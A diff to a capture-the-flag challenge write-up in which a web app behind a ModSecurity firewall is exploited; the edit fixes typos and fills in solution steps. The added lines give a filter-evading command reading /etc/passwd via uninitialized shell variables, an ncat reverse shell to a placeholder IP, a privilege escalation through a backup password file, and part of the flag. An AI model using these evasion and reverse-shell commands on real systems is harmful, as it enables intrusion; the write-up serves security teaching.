@@ -3,7 +3,7 @@
 ### Author: Delara (lara)
 
 ## Description
-We've heard one of the prisonors of omni was working on a website befor omni got to them. We suspect the website is quite buggy as it was still under development. Do you think you can break it?
+We've heard one of the prisoners of omni was working on a website before omni got to them. We suspect the website is quite buggy as it was still under development. Do you think you can break it?
 
 ## Hints
 1. Have you looked at robots.txt?
@@ -16,13 +16,12 @@ We've heard one of the prisonors of omni was working on a website befor omni got
 4. Looking through this file, we gain two valuable pieces of information,
    1. There is some proxy server running on the local network at '172.16.238.30'
    2. This website has Modsecurity firewall set up with CRS but one particular rule is excluded. 
-
 5. Now it's time to explore and see what commands we can and we cannot run.
 6. After exploring, you would be able to figure out you can run "dangerous" commands using uninitialized variables. 
-7. With this you can run this command '' to print '/etc/passwd'
-8. Furthermore, you can get reverse shell access using this command '' (note that this is one of the many ways you could have gotten a reverse shell)
+7. With this you can run this command 'cat /etc$u/passwd$u' to print '/etc/passwd'
+8. Furthermore, you can get reverse shell access using this command 'ncat$u <ip> <port> -e /bin$u/bash$u' (note that this is one of the many ways you could have gotten a reverse shell)
 9. Once you get a reverse shell, you will the user 'www-data'. Exploring the box, you will find that there is a file called 'message.txt' in the user's 'sappheiros' home directory but you don't have permission to read this file. So you somehow need to escalate your privilege. 
-10. In the '/opt/backup' directory there is a file called 'passwd.bak' which contains the user's password
+10. In the '/opt/backup' directory there is a file called 'cGFzc3dvcmQ' which contains the user's password
 11. Running 'su sappheiros' and giving it the password you found will make you the user
 12. Now that you have access to the home directory you should be able to read the file and the content is 'part 1: magpie{y0u_h4v3_7h3_'. This is the first part of the flag.
 13. We now need to explore the box more to figure out what the second part of the flag is. 
